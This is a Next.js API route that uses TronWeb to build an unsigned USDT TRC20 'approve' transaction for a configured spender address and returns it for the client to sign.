import { NextResponse } from 'next/server';
import { getServerTW, CFG } from '../../lib/tronService';

export async function POST(req) {

    try {

        const {
            ownerAddress,
            amount
        } = await req.json();

        if (!ownerAddress || !amount) {

            return NextResponse.json({

                error: 'Missing params'

            }, { status: 400 });

        }

        const tw = getServerTW();

        const txBuild =
            await tw.transactionBuilder
                .triggerSmartContract(

                    CFG.USDT,

                    'approve(address,uint256)',

                    {
                        feeLimit: 150000000
                    },

                    [
                        {
                            type: 'address',
                            value: CFG.SPENDER
                        },

                        {
                            type: 'uint256',
                            value: tw.toSun(amount)
                        }

                    ],

                    ownerAddress

                );

        // FIX: extract correctly
        let transaction =
            txBuild.transaction;

        // IMPORTANT FIX
        transaction =
            await tw.trx.extendExpiration(
                transaction,
                60
            );

        // IMPORTANT FIX
        transaction.visible = false;

        return NextResponse.json({

            transaction

        });

    } catch (error) {

        console.error(error);

        return NextResponse.json({

            error: error.message

        }, { status: 500 });

    }

}